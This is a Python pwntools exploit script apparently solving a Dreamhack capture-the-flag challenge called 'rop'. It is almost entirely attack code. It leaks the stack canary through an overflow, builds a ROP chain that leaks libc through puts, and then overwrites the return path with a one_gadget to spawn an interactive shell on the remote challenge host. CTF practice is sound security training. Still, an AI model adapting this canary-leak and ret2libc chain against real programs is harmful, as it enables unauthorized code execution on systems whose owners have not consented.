#!/usr/bin/env python3

from pwn import *

exe = ELF('rop_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+204
        c
        b*main+130
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 11924)
else:
    p = process([exe.path])
GDB()
########################################
### STAGE 1: Leak canary + Leak libc ###
########################################
sa(b'Buf: ', b'A'*0x38 + b'A')
p.recvuntil(b'A'*0x38)
canary_leak = u64(p.recv(8).ljust(8, b'\0'))
info("Canary: " + hex(canary_leak & ~0xff))

pop_rdi = 0x0000000000400853
payload1 = flat(
    b'A'*0x38,
    canary_leak & ~0xff,
    0,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
sa(b'Buf: ', payload1)

puts_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = puts_leak - libc.sym['puts']
info("Puts leak: " + hex(puts_leak))

#####################################
### STAGE 2: Overwrite One Gadget ###
#####################################
payload2 = flat(
    b'A'*0x38,
    canary_leak & ~0xff,
    )
sa(b'Buf: ', payload2)
rw_section = 0x601080 + 0x48
pop_vus = 0x000000000040084b
one_gadget = libc.address + 0xebd52
payload3 = flat(
    b'A'*0x38,
    canary_leak & ~0xff,
    0,
    pop_vus,
    rw_section,
    0,
    0,
    0,
    0,
    one_gadget,
    )
sa(b'Buf: ', payload3)

p.interactive()
